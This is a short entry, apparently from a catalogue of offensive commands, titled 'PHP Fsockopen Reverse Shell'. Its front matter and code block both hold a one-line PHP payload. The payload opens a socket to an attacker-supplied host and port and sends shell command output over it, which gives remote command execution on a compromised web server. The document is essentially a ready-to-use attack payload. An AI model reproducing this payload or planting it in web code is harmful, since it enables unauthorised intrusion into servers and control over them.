---
id: f2ab00cc-bec4-492c-8099-411dedff1357
name: PHP Fsockopen Reverse Shell
type: command
executor: null
data: <?php $sock=fsockopen("$_TARGET_IP",$_TARGET_PORT); fputs($sock, shell_exec('cmd'));?>
output: null
created_at: '2019-09-17T19:34:48.748780+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PHP Fsockopen Reverse Shell

```bash
<?php $sock=fsockopen("$_TARGET_IP",$_TARGET_PORT); fputs($sock, shell_exec('cmd'));?>
```


